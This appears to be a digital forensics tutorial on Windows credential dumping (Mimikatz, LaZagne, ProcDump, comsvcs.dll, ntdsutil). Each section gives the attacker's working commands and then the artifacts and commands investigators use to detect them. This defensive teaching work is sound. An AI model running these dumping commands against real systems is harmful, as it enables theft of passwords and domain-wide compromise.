

`Credential dumping` is a technique used by attackers to extract login credentials, such as usernames and passwords, from a compromised system. These credentials are often stored in memory, security databases, or cached locations by the operating system.

## 1. Mimikatz

The most famous credential dumping tool. Extracts plaintext passwords, NTLM hashes, and Kerberos tickets directly from Windows memory (LSASS process).

**How an attacker uses it:**

```bash
# Attacker runs on the victim Windows machine:
mimikatz.exe

# Inside mimikatz prompt:
privilege::debug                    # get SeDebugPrivilege (required)
sekurlsa::logonpasswords            # dump all logged-on users credentials
sekurlsa::wdigest                   # dump plaintext passwords (Win7/8)
sekurlsa::tickets                   # dump Kerberos tickets
lsadump::sam                        # dump SAM database (local hashes)
lsadump::dcsync /user:Administrator # pretend to be a DC, pull any hash
```

**Example output from `sekurlsa::logonpasswords`:**

```
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
UserName          : ALEX-PC$
Domain            : CORP
Logon Server      : DC01
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : aad3b435b51404eeaad3b435b51404ee  ← password hash
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        wdigest :
         * Username : Administrator
         * Domain   : CORP
         * Password : P@ssw0rd123!   ← plaintext password
```

**What you find as a forensic investigator:**

```bash
# 1. Mimikatz binary in Prefetch
ls /mnt/windows-image/Windows/Prefetch/ | grep -i "mimikatz"
# MIMIKATZ.EXE-A1B2C3D4.pf   ← proof it was executed

# 2. Parse the prefetch file for details
wine ~/dfir-labs/eztools/PECmd/PECmd.exe \
  -f "/mnt/windows-image/Windows/Prefetch/MIMIKATZ.EXE-A1B2C3D4.pf"
# Shows: run count, last run time, files it accessed

# 3. Event ID 4648 — logon with explicit credentials (mimikatz triggers this)
evtxdump.py /mnt/windows-image/Windows/System32/winevt/Logs/Security.evtx \
  | grep -A 20 "<EventID>4648</EventID>" \
  | grep -E "TimeCreated|TargetUserName|ProcessName"

# 4. Event ID 4656/4663 — LSASS handle request (mimikatz opens LSASS)
evtxdump.py Security.evtx \
  | grep -A 30 "<EventID>4656</EventID>" \
  | grep -E "ObjectName|ProcessName" \
  | grep -i "lsass"

# 5. Search for mimikatz strings in unallocated space
sudo grep -ria "sekurlsa\|mimikatz\|wdigest" /mnt/windows-image/ 2>/dev/null

# 6. Check Amcache for the binary hash (VirusTotal it)
rip.pl -r ./Amcache.hve -p amcache | grep -i "mimikatz"
```

**Key forensic indicators summary:**

```
Prefetch:    MIMIKATZ.EXE-*.pf
Event logs:  4648, 4656, 4663 targeting lsass.exe
Registry:    UserAssist entry for mimikatz.exe
AV logs:     Detection entries in Windows Defender logs
Strings:     "sekurlsa::", "privilege::debug" in memory/pagefile
```

---

## 2. LaZagne

An open-source tool that recovers stored passwords from browsers, email clients, databases, WiFi, and more — all in one run. No memory access needed, so it's stealthier than Mimikatz.

**How an attacker uses it:**

```bash
# Run everything at once
lazagne.exe all

# Target specific sources
lazagne.exe browsers        # Chrome, Firefox, IE saved passwords
lazagne.exe sysadmin        # PuTTY, WinSCP, FileZilla credentials
lazagne.exe databases       # MySQL, PostgreSQL stored creds
lazagne.exe wifi            # saved WiFi passwords
lazagne.exe mails           # Outlook, Thunderbird

# Save output to file (attacker often does this)
lazagne.exe all -oN          # output to plain text
lazagne.exe all -oJ          # output to JSON
```

**Example output:**

```
########## User: Alex ##########

------------------- Chrome passwords -----------------
URL:      https://corp-vpn.company.com/login
Login:    alex@company.com
Password: VpnP@ss2024!

------------------- WinSCP passwords -----------------
Host:     192.168.1.10
Login:    administrator
Password: AdminPass123
```

**What you find as a forensic investigator:**

```bash
# 1. LaZagne in Prefetch
ls /mnt/windows-image/Windows/Prefetch/ | grep -i "lazagne"
# LAZAGNE.EXE-B3C4D5E6.pf

# 2. Parse it — key thing is what FILES it accessed
wine ~/dfir-labs/eztools/PECmd/PECmd.exe \
  -f "/mnt/windows-image/Windows/Prefetch/LAZAGNE.EXE-B3C4D5E6.pf"
# Files accessed will include:
# \USERS\ALEX\APPDATA\LOCAL\GOOGLE\CHROME\USER DATA\DEFAULT\LOGIN DATA
# \USERS\ALEX\APPDATA\ROAMING\WINSCP.INI
# → proves it harvested browser credentials

# 3. Check Chrome Login Data database directly
cp "/mnt/windows-image/Users/Alex/AppData/Local/Google/Chrome/User Data/Default/Login Data" \
   ./chrome_logins.db

sqlite3 ./chrome_logins.db \
  "SELECT origin_url, username_value, date_created FROM logins ORDER BY date_created DESC;"
# If last_access timestamps cluster around the attack time → LaZagne accessed them

# 4. MFT — check access timestamps on credential files
grep -i "Login Data\|logins.json\|key4.db" mft_parsed.csv
# If Accessed time matches attack window → credential files were read

# 5. Event ID 4663 — file access audit on browser credential files
grep -A 20 "4663" security.xml | grep -i "login data\|logins.json"
```

**Key forensic indicators summary:**

```
Prefetch:   LAZAGNE.EXE-*.pf
MFT:        Access timestamps on Login Data, logins.json, key4.db
Event logs: 4663 on browser credential files
LNK files:  lazagne.exe.lnk in Recent folder
Output file: passwords.txt or results.json left on disk
```

---

## 3. ProcDump

A legitimate Microsoft Sysinternals tool — but attackers abuse it to dump the LSASS process memory to a `.dmp` file, then take that file offline to extract credentials.

**How an attacker uses it:**

```bash
# Dump LSASS process memory to a file
procdump.exe -ma lsass.exe lsass.dmp

# Using process ID directly
tasklist | findstr lsass          # find PID first
# lsass.exe    720   ...
procdump.exe -ma 720 lsass.dmp

# Attacker then copies lsass.dmp to their machine
# and runs Mimikatz offline on it (no AV on their machine):
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

**Why this is clever:** ProcDump is a signed Microsoft tool — AV often ignores it. The credential extraction happens offline so it's harder to detect in real time.

**What you find as a forensic investigator:**

```bash
# 1. ProcDump in Prefetch
ls /mnt/windows-image/Windows/Prefetch/ | grep -i "procdump"
# PROCDUMP.EXE-C4D5E6F7.pf  or  PROCDUMP64.EXE-*.pf

# 2. Look for the .dmp file left behind
find /mnt/windows-image/ -name "*.dmp" 2>/dev/null
find /mnt/windows-image/ -name "lsass*" 2>/dev/null
# lsass.dmp, lsass_timestamp.dmp, or custom names like svchost.dmp

# 3. If .dmp file exists, check its header to confirm it's LSASS
xxd /mnt/windows-image/Users/Alex/lsass.dmp | head -3
# 4d44 4d50  = "MDMP" = Windows minidump format ← confirmed

# 4. Event ID 10 (Sysmon) — process accessed lsass.exe
# If Sysmon is installed on the victim machine:
evtxdump.py "Microsoft-Windows-Sysmon%4Operational.evtx" \
  | grep -A 20 "<EventID>10</EventID>" \
  | grep -E "TargetImage|SourceImage|GrantedAccess" \
  | grep -i "lsass"
# TargetImage: C:\Windows\System32\lsass.exe
# SourceImage: C:\Users\Alex\Desktop\procdump.exe

# 5. Event ID 4656 — handle to LSASS requested
grep -A 30 "4656" security.xml \
  | grep -E "ObjectName|ProcessName" \
  | grep -i "lsass"

# 6. Check if the .dmp was copied to USB (cross-reference with USB artifacts)
rip.pl -r ./SYSTEM -p usbstor
# If USB was connected right after procdump ran → exfiltration
```

**Key forensic indicators summary:**

```
Prefetch:   PROCDUMP.EXE-*.pf or PROCDUMP64.EXE-*.pf
Files:      lsass.dmp anywhere on disk (especially user folders)
Event logs: 4656 with ObjectName=lsass.exe, Sysmon Event 10
MFT:        .dmp file entry — creation timestamp matches attack
USN Journal: lsass.dmp CREATE entry
```

---

## 4. Comsvcs.dll (Living off the Land)

No external tool needed — Windows has a built-in DLL that can dump LSASS. Attackers use this because it leaves less of a footprint — no foreign executable to detect.

**How an attacker uses it:**

```powershell
# From an elevated command prompt on victim machine:

# Step 1 — find LSASS PID
tasklist /fi "imagename eq lsass.exe"
# lsass.exe   720  ...

# Step 2 — dump using built-in Windows component
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 720 C:\Temp\lsass.dmp full

# One-liner version (attacker favorite)
rundll32 comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full
```

**Why this is dangerous:** `rundll32.exe` and `comsvcs.dll` are both legitimate signed Windows files — no malware is dropped. This is called a **Living off the Land (LotL)** attack.

**What you find as a forensic investigator:**

```bash
# 1. Event ID 4688 — process creation with full command line
grep -A 30 "4688" security.xml \
  | grep -E "TimeCreated|NewProcessName|CommandLine" \
  | grep -i "comsvcs\|rundll32"
# CommandLine: rundll32.exe comsvcs.dll MiniDump 720 C:\Temp\lsass.dmp full
# That command line IS the evidence

# 2. PowerShell logs — if run via PowerShell
evtxdump.py "Microsoft-Windows-PowerShell%4Operational.evtx" \
  | grep -i "comsvcs\|MiniDump\|lsass"

# 3. Prefetch for rundll32 (it runs constantly so check what DLLs it loaded)
wine ~/dfir-labs/eztools/PECmd/PECmd.exe \
  -f "/mnt/windows-image/Windows/Prefetch/RUNDLL32.EXE-*.pf" \
  | grep -i "comsvcs\|lsass\|temp"

# 4. Find the .dmp file
find /mnt/windows-image/ -name "*.dmp" 2>/dev/null
find /mnt/windows-image/Windows/Temp -type f 2>/dev/null
find /mnt/windows-image/Users -name "*.dmp" 2>/dev/null

# 5. ConsoleHost_history (PowerShell command history)
cat "/mnt/windows-image/Users/Alex/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
# rundll32 comsvcs.dll, MiniDump ...   ← attacker forgot to clear this
```

**Key forensic indicators summary:**

```
Event logs: 4688 CommandLine containing "comsvcs" + "MiniDump"
PowerShell: Operational log + ConsoleHost_history.txt
Prefetch:   RUNDLL32.EXE-*.pf accessing comsvcs.dll
Files:      .dmp file in Temp, Desktop, or user folders
```

---

## 5. Ntdsutil

`ntds.dit` is the Active Directory database — it contains the hashes of **every user in the entire domain**. If an attacker gets this file, they own the whole network. `ntdsutil` is a legitimate Windows Server tool used by admins, abused by attackers to copy it.

**How an attacker uses it:**

```powershell
# Run on a Domain Controller with admin rights:

# Method 1 — ntdsutil (built-in AD tool)
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ntds_dump" quit quit
# Creates:
# C:\Temp\ntds_dump\Active Directory\ntds.dit   ← the database
# C:\Temp\ntds_dump\registry\SYSTEM             ← needed to decrypt it

# Method 2 — Volume Shadow Copy (VSS)
vssadmin create shadow /for=C:
# Then copy ntds.dit from the shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\

# After exfiltrating ntds.dit + SYSTEM hive, attacker runs on their machine:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
# Dumps ALL domain hashes
```

**What you find as a forensic investigator:**

```bash
# 1. ntdsutil in Prefetch (on the Domain Controller image)
ls /mnt/windows-image/Windows/Prefetch/ | grep -i "ntdsutil"
# NTDSUTIL.EXE-A1B2C3D4.pf

# 2. Parse the prefetch — look at what paths it accessed
wine ~/dfir-labs/eztools/PECmd/PECmd.exe \
  -f "/mnt/windows-image/Windows/Prefetch/NTDSUTIL.EXE-*.pf"
# Files accessed will include C:\Temp\ntds_dump path

# 3. Look for the ntds.dit copy left on disk
find /mnt/windows-image/ -name "ntds.dit" 2>/dev/null
# If found outside C:\Windows\NTDS\ → it was copied by attacker

# 4. Check VSS activity in Event Logs
evtxdump.py System.evtx | grep -i "shadow\|vss\|volsnap" -A 10

# 5. Event ID 4688 — ntdsutil or vssadmin command
grep -A 30 "4688" security.xml \
  | grep "CommandLine" \
  | grep -i "ntdsutil\|vssadmin\|shadow"

# 6. Check if ntds.dit was accessed via MFT
grep -i "ntds.dit" mft_parsed.csv
# Look at Accessed timestamp — if it doesn't match normal DC operation time → suspicious

# 7. Directory Services log
evtxdump.py "Directory Service.evtx" \
  | grep -E "EventID>325|EventID>326"
# Event 325 = database attached
# Event 326 = database detached (snapshot operation)

# 8. impacket-secretsdump can parse ntds.dit directly on Kali
sudo apt install python3-impacket -y
impacket-secretsdump -ntds ./ntds.dit -system ./SYSTEM LOCAL | head -30
# Administrator:500:aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
# That hash can be cracked with hashcat or used in pass-the-hash attacks
```

**Key forensic indicators summary:**

```
Prefetch:    NTDSUTIL.EXE-*.pf
Files:       ntds.dit copy outside C:\Windows\NTDS\
Event logs:  4688 with ntdsutil/vssadmin command line, DS Event 325/326
MFT:         ntds.dit access timestamp outside maintenance window
VSS:         Shadow copy created then deleted shortly after
```

